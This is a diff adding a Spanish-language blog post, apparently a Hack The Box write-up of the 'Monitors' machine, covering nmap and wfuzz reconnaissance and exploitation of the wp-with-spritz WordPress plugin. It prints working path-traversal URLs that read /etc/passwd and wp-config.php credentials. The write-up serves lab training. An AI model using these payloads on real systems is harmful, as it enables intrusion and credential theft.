@@ -16,6 +16,624 @@
     
     
       <item>
+        <title>Monitors - Hack The Box</title>
+        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El día de hoy vamos a estar resolviendo la máquina &lt;em&gt;Monitors&lt;/em&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;
+
+&lt;p&gt;Primeramente vamos a lanzar una &lt;em&gt;traza ICMP&lt;/em&gt; para saber si la máquina está activa.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.238
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Linux&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Sistema Operativo (OS)&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.238 -R
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/3a.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Posteriormente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.238
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.238
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22,80 10.10.10.238
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; (22) y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; (80).&lt;/p&gt;
+
+&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
+
+&lt;p&gt;Para enumerar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;, usaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;, una herramienta que se encarga de identificar las tecnologías web que se están utilizando. Esto incluye gestores de contenido (CMS), librerías, plugins, o incluso el sistema operativo en el que se está alojando el servidor web.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.238
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El escaneo nos devuelve un código de estado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;403 Forbidden&lt;/code&gt;, lo que indica que el acceso directo está restringido. Sin embargo, si que podemos ver que el servidor utiliza &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache 2.4.29&lt;/code&gt; como servidor web y revela también una dirección de correo electrónico, aunque esta información no nos revela mucho más de forma directa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que no podemos obtener más información útil desde la terminal, tendremos que visitar la página desde nuestro navegador. Al acceder, observaremos un mensaje que indica que el acceso directo por IP no está permitido y sugiere contactar con el administrador del sitio mediante un correo electrónico cuyo dominio es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monitors.htb&lt;/code&gt;. Esto es una pista importante, ya que un dominio en el correo electrónico sugiere que el servidor está configurado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual hosting&lt;/code&gt;; es decir, el servidor usa nombres de dominio específicos para identificar los sitios alojados.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para verificarlo, editamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; para que el nombre de dominio se resuelva a la dirección IP del servidor correspondiente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez realizado este cambio, al relanzar nuestros escaneos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;, ahora obtenemos mucha más información:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo más relevante que encontramos en este nuevo escaneo es que el servidor está utilizando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress 5.5.1&lt;/code&gt;, lo que nos permite identificar el gestor de contenido utilizado, además de confirmar que el servidor está corriendo sobre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ubuntu&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Después de un rato explorando la página, no encontramos nada de especial interés. No obstante, sabiendo que el sitio utiliza &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress&lt;/code&gt;, podemos buscar rutas comunes como paneles de administración, directorios de contenido y otras rutas típicas del &lt;em&gt;CMS&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En mi caso, decidí aplicar &lt;em&gt;fuzzing&lt;/em&gt; para encontrar estas rutas potenciales.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -c -L -t 400 --hc 404 --hh 12759 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/FUZZ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entre las rutas halladas, encontramos el panel de administración &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-admin&lt;/code&gt;; sin embargo, intentar acceder con credenciales conocidas por defecto no será efectivo en este caso.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;También descubrimos que el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-content&lt;/code&gt; es accesible, lo cual representa un error de configuración, ya que este directorio contiene recursos del &lt;em&gt;CMS&lt;/em&gt; que deberían estar protegidos. Dentro de este directorio, podemos realizar un segundo &lt;em&gt;fuzzing&lt;/em&gt; (o, alternativamente, podríamos buscar manualmente rutas específicas), llevándonos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plugins&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -c -L -t 400 --hc 404 --hh 0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/wp-content/FUZZ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Allí encontramos el plugin &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-with-spritz&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al descargar su archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readme.txt&lt;/code&gt; y revisarlo, confirmamos que se está utilizando la versión 1.0 de este plugin.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con esta información, podemos pasar a investigar si esta versión presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en &lt;em&gt;Exploit Database&lt;/em&gt; —por ejemplo—, o directamente desde la consola usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit spritz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Encontramos un exploit para este plugin en esta versión que explota una vulnerabilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote File Inclusion&lt;/code&gt; (RFI).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para verificar si esto funciona, podemos crear un archivo de texto cualquiera y, mediante &lt;em&gt;Python&lt;/em&gt;, podemos hostear un servidor &lt;em&gt;HTTP&lt;/em&gt; desde la misma ruta del archivo para que sea accesible mediante:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 -m http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora, si apuntamos a la ruta URL que aparece a continuación, veremos que podemos leer el contenido que habíamos escrito en nuestro archivo de texto.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://&amp;lt;nuestraIP&amp;gt;:80/&amp;lt;nombreArchivo&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sin embargo, si intentamos cargar una &lt;em&gt;reverse shell&lt;/em&gt;, esta no se ejecutará debido a que el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RFI&lt;/code&gt; utiliza la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_get_contents&lt;/code&gt;, que simplemente lee el contenido de un archivo o URL como texto sin interpretar o ejecutar ningún código &lt;em&gt;PHP&lt;/em&gt; que contenga.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No obstante, aunque no podamos explotar este &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RFI&lt;/code&gt;, sí que podemos aprovecharnos del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local File Inclusion&lt;/code&gt; (LFI), vulnerabilidad que ya explicamos en un &lt;a href=&quot;https://mateonitro550.github.io/es/Local-File-Inclusion-(LFI)/&quot;&gt;artículo anterior&lt;/a&gt;. Confirmamos que tenemos capacidad de lectura, ya que logramos listar el contenido del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Leer este archivo desde el navegador puede ser complicado, así que podríamos utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + U&lt;/code&gt; para verlo de mejorar manera.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que tenemos acceso a archivos en el sistema, el siguiente paso lógico es buscar archivos de configuración importantes. Por ejemplo, el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-config.php&lt;/code&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress&lt;/code&gt; suele contener información sensible, como el nombre de usuario, la contraseña y el nombre de la base de datos necesarios para que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress&lt;/code&gt; se conecte a su base de datos. Este archivo, por defecto, se encuentra en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/wordpress&lt;/code&gt;, por lo que podríamos acceder a esta ruta para leer su contenido.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../var/www/wordpress/wp-config.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aunque podemos probar estas credenciales en el panel &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-admin&lt;/code&gt;, no nos permitirán acceder.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente sería explorar los archivos de configuración de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt; se instala por defecto en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/&lt;/code&gt;, por lo que podemos intentar leer el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache2.conf&lt;/code&gt;, el cual es el archivo principal de configuración del servidor web. Además, este archivo nos provee una visión básica de la estructura jerárquica de sus archivos de configuración, lo cual nos sugiere rutas potenciales donde buscar archivos adicionales de interés.&lt;/p&gt;
+
+&lt;p&gt;Para entender mejor esta jerarquía y adaptarnos a las configuraciones específicas de este servidor, podemos referirnos a esta &lt;a href=&quot;https://cwiki.apache.org/confluence/display/httpd/DistrosDefaultLayout#DistrosDefaultLayout-Debian,Ubuntu(Apachehttpd2.x):&quot;&gt;documentación&lt;/a&gt;. Es importante tener en cuenta que, como observamos al inicio, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt; está corriendo sobre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ubuntu&lt;/code&gt;, por lo que su configuración puede diferir en otros sistemas operativos, donde ciertas rutas o archivos de configuración pueden estar ubicados en lugares diferentes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
